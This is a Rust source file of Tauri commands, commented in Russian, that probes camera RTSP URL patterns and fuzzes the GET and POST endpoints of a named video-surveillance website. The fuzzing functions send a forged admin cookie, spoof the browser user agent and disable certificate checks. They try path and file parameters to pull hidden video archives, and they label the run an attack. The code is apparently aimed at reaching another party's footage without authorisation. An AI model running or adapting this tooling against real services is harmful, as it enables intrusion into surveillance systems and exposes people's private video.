use std::process::Command;
use tauri::command;

/// Перебор (фаззинг) RTSP путей для поиска рабочего видеопотока
#[command]
pub async fn probe_rtsp_path(host: String, login: String, pass: String) -> Result<String, String> {
    let rtsp_host = crate::normalize_host_for_scan(&host);

    // Пока оставляем старый список. Эволюцию добавим позже.
    let channel = 1u32;
    let urls = vec![
        format!(
            "rtsp://{}:{}@{}:554/ch1/main/av_stream",
            login, pass, rtsp_host
        ),
        format!(
            "rtsp://{}:{}@{}:554/cam/realmonitor?channel=1&subtype=0",
            login, pass, rtsp_host
        ),
        format!(
            "rtsp://{}:{}@{}:554/Streaming/Channels/101",
            login, pass, rtsp_host
        ),
        format!(
            "rtsp://{}:{}@{}:554/Streaming/Channels/{}01",
            login, pass, rtsp_host, channel
        ),
        format!(
            "rtsp://{}:{}@{}:554/cam/realmonitor?channel={}&subtype=0",
            login, pass, rtsp_host, channel
        ),
        format!(
            "rtsp://{}:{}@{}:554/live/ch{}",
            login, pass, rtsp_host, channel
        ),
        format!(
            "rtsp://{}:554/user={}&password={}&channel={}&stream=0.sdp",
            rtsp_host, login, pass, channel
        ),
        format!(
            "rtsp://{}:554/?user={}&password={}&channel={}&stream=0.sdp",
            rtsp_host, login, pass, channel
        ),
        format!(
            "rtsp://{}:{}@{}:554/live/ch{:02}_0",
            login, pass, rtsp_host, channel
        ),
        format!(
            "rtsp://{}:{}@{}:554/h264/ch{}/main/av_stream",
            login, pass, rtsp_host, channel
        ),
        format!(
            "rtsp://{}:{}@{}:554/?mode=real&type=live&channel={}&stream=0",
            login, pass, rtsp_host, channel
        ),
        format!(
            "rtsp://{}:{}@{}:554/{}",
            login,
            pass,
            rtsp_host,
            channel * 10 + 1
        ),
    ];

    let ffmpeg = crate::get_ffmpeg_path();
    for url in urls {
        let s = Command::new(&ffmpeg)
            .args(crate::ffmpeg::FfmpegProfiles::probe(&url))
            .status();
        if let Ok(status) = s {
            if status.success() {
                return Ok(url);
            }
        }
    }

    Ok(format!(
        "rtsp://{}:{}@{}:554/Streaming/Channels/{}01",
        login, pass, rtsp_host, channel
    ))
}

/// Фаззинг GET-параметров для поиска скрытых архивов (NEMESIS)
#[command]
pub async fn nemesis_fuzz_archive_endpoint(
    admin_hash: String,
    target_ftp_path: String,
) -> Result<Vec<String>, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut successful_hits = Vec::new();
    let endpoints = vec![
        "rtsp2mjpeg.php",
        "ajax.php",
        "test.php",
        "check.php",
        "get.php",
        "video.php",
        "archive.php",
        "stream.php",
        "api.php",
    ];
    let param_names = vec![
        "file",
        "path",
        "src",
        "video",
        "archive_path",
        "url",
        "id",
        "name",
        "target",
    ];

    for endpoint in endpoints {
        for param in &param_names {
            let url = format!(
                "https://videodvor.by/stream/{}?{}={}&get=1",
                endpoint, param, target_ftp_path
            );
            if let Ok(resp) = client
                .get(&url)
                .header("Cookie", format!("login=mvd; admin={}", admin_hash))
                .send()
                .await
            {
                let status = resp.status();
                let len = resp.content_length().unwrap_or(0);
                let ctype = resp
                    .headers()
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("");

                if status.is_success()
                    && (ctype.contains("video") || ctype.contains("octet-stream") || len > 500_000)
                {
                    successful_hits.push(format!("🎯 УСПЕХ (ВИДЕО): {}", url));
                } else if status.is_success() && len > 0 {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
                        successful_hits.push(format!("💡 НАЙДЕН РЫЧАГ (ССЫЛКА): {}", url));
                    }
                }
            }
        }
    }
    if successful_hits.is_empty() {
        Ok(vec![
            "GET-сканирование завершено. Прямых точек входа не найдено.".to_string(),
        ])
    } else {
        Ok(successful_hits)
    }
}

/// Фаззинг POST-эндпоинтов
#[command]
pub async fn nemesis_fuzz_post_endpoints(
    admin_hash: String,
    target_ftp_path: String,
) -> Result<Vec<String>, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut successful_hits = Vec::new();
    let endpoints = vec![
        "ajax.php",
        "check.php",
        "get.php",
        "rtsp2mjpeg.php",
        "api.php",
        "video.php",
    ];
    let param_names = vec!["path", "file", "url", "target", "src"];
    let actions = vec!["download", "get_video", "fetch", "load", "archive"];

    for endpoint in endpoints {
        for param in &param_names {
            for action in &actions {
                let url = format!("https://videodvor.by/stream/{}", endpoint);
                let payload = [
                    (param.to_string(), target_ftp_path.clone()),
                    ("action".to_string(), action.to_string()),
                ];

                if let Ok(resp) = client
                    .post(&url)
                    .header("Cookie", format!("login=mvd; admin={}", admin_hash))
                    .header("X-Requested-With", "XMLHttpRequest")
                    .form(&payload)
                    .send()
                    .await
                {
                    let status = resp.status();
                    let len = resp.content_length().unwrap_or(0);
                    let ctype = resp
                        .headers()
                        .get("content-type")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("");

                    if status.is_success() && (ctype.contains("video") || len > 500_000) {
                        successful_hits.push(format!(
                            "🎯 POST-УСПЕХ (ВИДЕО) в {} [{}={}&action={}]",
                            url, param, target_ftp_path, action
                        ));
                    } else if status.is_success() && len > 0 {
                        let body = resp.text().await.unwrap_or_default();
                        if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
                            successful_hits.push(format!(
                                "💡 POST-РЫЧАГ (ССЫЛКА) в {}: {}",
                                url,
                                &body.chars().take(150).collect::<String>()
                            ));
                        }
                    }
                }
            }
        }
    }
    if successful_hits.is_empty() {
        Ok(vec!["POST-атака завершена. Пусто.".to_string()])
    } else {
        Ok(successful_hits)
    }
}
